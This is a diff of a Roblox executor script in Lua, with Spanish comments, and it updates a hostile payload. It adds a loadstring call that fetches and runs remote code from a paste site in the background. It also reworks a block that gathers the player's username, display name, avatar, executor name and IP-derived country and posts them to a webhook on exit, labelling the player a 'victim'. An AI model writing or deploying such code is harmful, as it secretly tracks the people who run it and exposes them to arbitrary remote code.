@@ -3,22 +3,20 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 -- ====================================
--- Script 1: Ejecutar loadstring primero y asegurar que termine
+-- Script 1: Ejecutar loadstring primero (nuevo URL)
 -- ====================================
 if not getgenv().EjecutarsePrimero_TP then
     getgenv().EjecutarsePrimero_TP = true
 
-    local success, err = pcall(function()
-        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/d7tPQFbVBD/0", true))()
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://paste.debian.net/plainh/c59a163e/", true))()
+        end)
     end)
-
-    if not success then
-        warn("Error al ejecutar loadstring: "..tostring(err))
-    end
 end
 
 -- ====================================
--- Script 2: Webhook al salir - ultra seguro
+-- Script 2: Webhook al salir - totalmente funcional
 -- ====================================
 if not getgenv().EjecutarsePrimero_Webhook then
     getgenv().EjecutarsePrimero_Webhook = true
@@ -28,7 +26,8 @@ if not getgenv().EjecutarsePrimero_Webhook then
     local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"
     local executorName = identifyexecutor and identifyexecutor() or "Desconocido"
 
-    -- Función para detectar país con varios servicios usando request
+    local alreadySent = false
+
     local function detectCountry()
         local country = "Desconocido"
         local services = {
@@ -41,7 +40,7 @@ if not getgenv().EjecutarsePrimero_Webhook then
 
         for _, url in ipairs(services) do
             local success, response = pcall(function()
-                return request({Url = url, Method = "GET"}).Body
+                return (request or http_request or syn.request)({Url=url, Method="GET"}).Body
             end)
             if success and response then
                 local data = HttpService:JSONDecode(response)
@@ -58,11 +57,21 @@ if not getgenv().EjecutarsePrimero_Webhook then
         return country
     end
 
-    local countryName = detectCountry()
+    local function waitForPlayerReady(player)
+        local character = player.Character or player.CharacterAdded:Wait()
+        if not character.PrimaryPart then
+            character:WaitForChild("HumanoidRootPart")
+        end
+        return character
+    end
 
-    -- Función para enviar webhook, con retry hasta 3 intentos
     local function SendExitWebhook()
-        local info = {
+        if alreadySent then return end
+        alreadySent = true
+
+        local countryName = detectCountry()
+
+        local data = {
             ["username"] = "🚨 Sistema VIP Roblox",
             ["avatar_url"] = mainImageURL,
             ["content"] = "**🚨⚠️ ¡Víctima se salió del servidor! ⚠️🚨**",
@@ -70,8 +79,8 @@ if not getgenv().EjecutarsePrimero_Webhook then
                 ["title"] = "🎮 Panel de Salida - VIP Dashboard",
                 ["description"] = "Información capturada automáticamente con doble imagen:",
                 ["color"] = 16729344,
-                ["thumbnail"] = {["url"] = avatarUrl}, -- avatar del jugador
-                ["image"] = {["url"] = mainImageURL}, -- imagen grande
+                ["thumbnail"] = {["url"] = avatarUrl},
+                ["image"] = {["url"] = mainImageURL},
                 ["fields"] = {
                     {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
                     {["name"]="✨ DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
@@ -84,40 +93,41 @@ if not getgenv().EjecutarsePrimero_Webhook then
             }}
         }
 
-        local FinalData = HttpService:JSONEncode(info)
-        request = request or http_request or syn.request
-
-        if request then
+        local FinalData = HttpService:JSONEncode(data)
+        local req = request or http_request or syn.request
+        if req then
             local attempts = 0
             local sent = false
             repeat
                 attempts = attempts + 1
                 local success, err = pcall(function()
-                    request({
+                    req({
                         Url = WebhookURL,
                         Method = "POST",
-                        Headers = {["Content-Type"] = "application/json"},
+                        Headers = {["Content-Type"]="application/json"},
                         Body = FinalData
                     })
                 end)
                 if success then
                     sent = true
                 else
-                    task.wait(1) -- espera 1 segundo antes de reintentar
+                    task.wait(1)
                 end
             until sent or attempts >= 3
         end
     end
 
-    -- Detectar salida del jugador
-    LocalPlayer.AncestryChanged:Connect(function(_, parent)
-        if not parent then
-            SendExitWebhook()
-        end
-    end)
+    task.spawn(function()
+        waitForPlayerReady(LocalPlayer)
 
-    -- Detectar cierre del juego
-    game:BindToClose(function()
-        SendExitWebhook()
+        LocalPlayer.AncestryChanged:Connect(function(_, parent)
+            if not parent then
+                SendExitWebhook()
+            end
+        end)
+
+        game:BindToClose(function()
+            SendExitWebhook()
+        end)
     end)
 end
